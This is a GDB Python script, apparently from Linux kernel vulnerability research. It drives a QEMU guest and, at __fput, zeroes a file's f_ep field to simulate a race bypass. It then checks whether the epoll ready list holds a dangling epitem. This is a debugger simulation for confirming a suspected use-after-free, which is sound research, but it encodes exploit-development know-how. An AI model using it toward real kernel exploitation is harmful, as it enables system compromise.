# exp_hyp012_swaps_gdb.py — HYP-012: GDB Automation for swaps_poll Gated Write
import gdb
import time
import os

gdb.execute("set pagination off")
gdb.execute("set confirm off")
gdb.execute("set non-stop off")

os.makedirs("evidence/HYP-012", exist_ok=True)
gdb.execute("set logging file evidence/HYP-012/HYP-012_raw_gdb.log")
gdb.execute("set logging overwrite on")
gdb.execute("set logging enabled on")

def log(msg):
    print(f"[HYP-012-GDB] {msg}", flush=True)

def to_u64(val):
    return int(val) & 0xFFFFFFFFFFFFFFFF

def connect():
    for i in range(10):
        try:
            gdb.execute("target remote :1234")
            log("Connected to QEMU on :1234")
            return True
        except gdb.error as e:
            log(f"Connection failed: {e}, retrying...")
            time.sleep(1)
    return False

if not connect():
    log("Failed to connect.")

class FputBreakpoint(gdb.Breakpoint):
    def __init__(self):
        super(FputBreakpoint, self).__init__("__fput", internal=False)

    def stop(self):
        file_ptr = to_u64(gdb.parse_and_eval("$x0"))
        try:
            f_ep = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({file_ptr} + 208)"))
        except Exception:
            return False

        if f_ep != 0:
            log("=================================================================")
            log(f"[HYP-012] Thread B entered __fput(file={hex(file_ptr)})")
            log("  Simulating Stage-2 fast-path bypass on victim inner_file...")
            gdb.execute(f"set *(unsigned long*)({file_ptr} + 208) = 0")
            log("  [SIMULATION SUCCESS] file->f_ep zeroed.")
            log("=================================================================")
            self.enabled = False
            return False
        return False

# We also want to monitor when ep_item_poll executes to verify rdllist
class EpShowFdinfoBreakpoint(gdb.Breakpoint):
    def __init__(self):
        super(EpShowFdinfoBreakpoint, self).__init__("ep_show_fdinfo", internal=False)

    def stop(self):
        f_epfile = to_u64(gdb.parse_and_eval("$x1"))
        ep_struct = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({f_epfile} + 200)"))
        try:
            rb_root = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({ep_struct} + 104)"))
            # We want to check rdllist which is at offset 80 (rdllist.next)
            rdllist_next = to_u64(gdb.parse_and_eval(f"*(unsigned long*)({ep_struct} + 80)"))
            log(f"  [HYP-012] ep_show_fdinfo: ep_struct={hex(ep_struct)}")
            log(f"            ep->rdllist.next = {hex(rdllist_next)}")
            log(f"            ep->rbr.rb_root = {hex(rb_root)}")
            
            if rdllist_next != (ep_struct + 80):
                log("  [+] SUCCESS: ep->rdllist is NOT empty (dangling epitem armed!)")
            else:
                log("  [-] FAIL: ep->rdllist is EMPTY")
        except Exception as e:
            log(f"  Error reading fields: {e}")
        return False

bp_fput = FputBreakpoint()
bp_fdinfo = EpShowFdinfoBreakpoint()

log("Breakpoints installed. Continuing execution...")
try:
    gdb.execute("continue")
except gdb.error as e:
    log(f"Continue returned: {e}")

gdb.execute("quit")
